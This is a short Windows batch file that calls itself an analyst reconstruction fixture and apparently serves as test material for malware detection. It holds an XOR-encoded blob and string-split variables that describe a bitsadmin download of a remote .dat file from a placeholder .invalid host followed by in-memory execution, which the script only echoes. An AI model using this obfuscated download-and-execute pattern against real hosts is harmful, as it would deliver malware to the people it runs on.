@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:decimal_bytes|xor_5a
rem HUNTRESS-MATERIAL:44.103.107.38.41.46.63.42.41.103.59.57.43.47.51.40.63.5.40.63.55.53.46.63.118.62.51.41.42.59.46.57.50.5.55.63.55.53.40.35.38.59.62.59.42.46.63.40.103.56.51.46.41.59.62.55.51.52.116.63.34.63.38.41.46.59.61.63.5.57.53.47.52.46.103.107.38.61.40.59.42.50.103.60.59.52.5.53.47.46.38.52.63.34.46.5.54.59.52.61.47.59.61.63.103.52.53.52.63.38.57.59.55.42.59.51.61.52.5.51.62.103.57.59.55.42.59.51.61.52.119.107.104.99.99.63.108.109.111.60.60.38.47.40.54.103.50.46.46.42.41.96.117.117.107.104.99.99.63.108.109.111.60.60.116.63.34.59.55.42.54.63.116.51.52.44.59.54.51.62.117.109.62.105.111.99.105.56.56.116.62.59.46
rem analyst reconstruction fixture
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "h0=v=1|steps=acquire_remote,dispatch_memory|adapter="& rem HUNTRESS quote compound
set "h1=bitsadmin.exe|stage_count=1|graph=fan_out|next_la"& rem HUNTRESS quote compound
set "h2=nguage=none|campaign_id=campaign-1299e675ff|url=h"& rem HUNTRESS quote compound
set "h3=ttps://1299e675ff.example.invalid/7d3593bb.dat"& rem HUNTRESS quote compound
goto :HUNTRESS_SEPARATOR_DONE
ver >nul & rem HUNTRESS separator ampersand
:HUNTRESS_SEPARATOR_DONE
set "neutral_arithmetic=5dc5d941"
ver >nul
if errorlevel 1 exit /b 1
call set "cfg=%%h0%%%%h1%%%%h2%%%%h3%%"
echo(!cfg!
exit /b 0
:HUNTRESS_PLAN
echo bitsadmin.exe GET https://1299e675ff.example.invalid/7d3593bb.dat then dispatch memory
exit /b 0
